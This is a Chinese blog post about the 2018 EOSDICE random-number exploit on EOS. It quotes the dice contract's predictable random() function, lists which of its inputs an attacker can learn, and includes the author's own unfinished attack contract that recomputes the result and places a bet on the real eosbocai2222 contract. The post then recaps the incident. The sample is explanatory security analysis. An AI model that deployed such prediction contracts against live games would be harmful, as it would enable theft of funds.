---
title: EOSDIEC 随机数被攻破
categories:
  - 区块链
date: 2018-11-04 08:49:35
tags:
---

## EOSDICE

![](http://ww1.sinaimg.cn/large/cfc08357gy1fwvqt03svej211i0c4jt4.jpg)

今天起床看到 EODICE随机数竟然被攻破了？

之前我还看过代码，觉得挺安全的，看来我还是太菜了

随机数代码如下 (来源于[github](https://github.com/loveblockchain/eosdice/blob/master/eosbocai2222.hpp))


```c++
    uint8_t random(account_name name, uint64_t game_id)
    {
        asset pool_eos = eosio::token(N(eosio.token)).get_balance(_self, symbol_type(S(4, EOS)).name());
        auto mixd = tapos_block_prefix() * tapos_block_num() + name + game_id - current_time() + pool_eos.amount;

        const char *mixedChar = reinterpret_cast<const char *>(&mixd);

        checksum256 result;
        sha256((char *)mixedChar, sizeof(mixedChar), &result);

        uint64_t random_num = *(uint64_t *)(&result.hash[0]) + *(uint64_t *)(&result.hash[8]) + *(uint64_t *)(&result.hash[16]) + *(uint64_t *)(&result.hash[24]);
        return (uint8_t)(random_num % 100 + 1);
    }
```
可以看到生成随机数 有几个特别的东西

1. game_id 这个是递增的，可以拿到
2. account_name 这个是玩家的用户名，可以拿到
3. pool_eos 这个是当前合约的余额，如果短时间没有人玩的话，是可以拿到固定的值的
4. tapos_block_prefix & tapos_block_num 这两个是区块内部的值，如果我用合约来攻击的话，可以拿到
5. current_time 当前时间戳(合约用了延时交易)

我当时看到这个合约的时候,其实有想过怎么攻击,但是发现变量比较多,应该比较难,攻击合约需要满足以下条件

1. 需要短时间内没有人玩，要不然game_id 与 pool_eos都会变动，导致你攻击失败
2. 必须要把攻击合约与 出结果 的时间控制在一个区块内，要不然 tapos_block_prefix & tapos_block_num 这两个数会发生改变
3. 之前我一直觉得没办法攻击的是 时间，因为合约取的是未来时间的（其实发现了eos 延时合约运行的话,延时多久，时间往后加就行了。。。） 这点要是想明白了，说不定暴富的人就是我了...

我写的一个模拟攻击合约,不知道是不是因为本地测试的原因，tapos_block_prefix & tapos_block_num 一直对不上

其实本来想 直接从合约拿到他的 game_id的，但是一直没有成功...
```c++
void charity::hi(uint64_t game_id)

{
    asset pool_eos = eosio::token(N(eosio.token)).get_balance(N(eosbocai2222), symbol_type(S(4, EOS)).name());
    pool_eos.amount += 9985;
    uint64_t t = current_time();
    t += 1000000;
    auto mixd = tapos_block_prefix() * tapos_block_num() + _self + game_id - t + pool_eos.amount;
    const char *mixedChar = reinterpret_cast<const char *>(&mixd);

    checksum256 result;
    sha256((char *)mixedChar, sizeof(mixedChar), &result);

    uint64_t random_num = *(uint64_t *)(&result.hash[0]) + *(uint64_t *)(&result.hash[8]) + *(uint64_t *)(&result.hash[16]) + *(uint64_t *)(&result.hash[24]);
    print("random", random_num % 100 + 1);

    // return (uint8_t)(random_num % 100 + 1);
    asset payout = asset(10000, S(4, EOS));
    action(
        permission_level{_self, N(active)},
        N(eosio.token), N(transfer),
        std::make_tuple(_self, N(eosbocai2222), payout, std::string("dice-rrr-50-")))
        .send();
}
```

来一张测试截图

![](http://ww1.sinaimg.cn/large/cfc08357gy1fwvr9gr5g2j21aw0ictes.jpg)

可以看到除了 tapos_block_prefix & tapos_block_num 这两个不一样的话，其他的都一样的，

tapos_block_num 应该是每次+1,tapos_block_prefix 不知道生成规则，但是如果在一个区块内，应该是能拿到相同的.

## 事件回顾

根据官方给出的账号，我找到了黑客的攻击截图

![](http://ww1.sinaimg.cn/large/cfc08357gy1fwvriwhyucj21rw0yajxj.jpg)

![](http://ww1.sinaimg.cn/large/cfc08357gy1fwvrehi0zmj21g40zmjwx.jpg)


![](http://ww1.sinaimg.cn/large/cfc08357gy1fwvrkwvmugj22a20gw423.jpg)

不知道黑客代码怎么写的，他现在已经把合约换掉了...并且吧钱转到了交易所

根据官方所说，他们有对合约自动检测工具，导致被发现疑似黑客事件，立马把钱转走了.

这一点还是值得表扬的，说明团队实力还是有的。（希望可以开源，这样的话，其他的dice被攻击了也不至于损失那么惨）
![自动转账截图](http://ww1.sinaimg.cn/large/cfc08357gy1fwvru0n2g3j20tc06s0t8.jpg)

好像公告发布的也比较早，不知道是不是 自动检测功能能把人call醒（哈哈哈）

## 总结与反思

![](http://ww1.sinaimg.cn/large/cfc08357gy1fwvrwv3i17j20iw0bkgn4.jpg)

当被攻击后，有网友在官方群发了这样的一句话...

让我想起一个笑话

>A: 为什么你玩DApp？
    B: 因为开源透明代码可见，更公平
    A：最近玩什么呢
    B：EOS上的菠菜
    A：开源了么？
    B：没有

我一直觉得 区块链合约肯定要开源，要不然和其他的有啥区别呢?

我个人为啥投了这个游戏呢？是因为这个游戏开源，符合我理想中的区块链游戏，不会发生黑我的情况...

本以为他做大了，能给整个社区起一个带头作用，告诉大家，开源合约也没事情的，区块链游戏就是需要开源！

但是还好，损失不是很大。

最后借用老猫的一张图
![](http://ww1.sinaimg.cn/large/cfc08357gy1fwvs1n7542j20u02bc4qp.jpg)





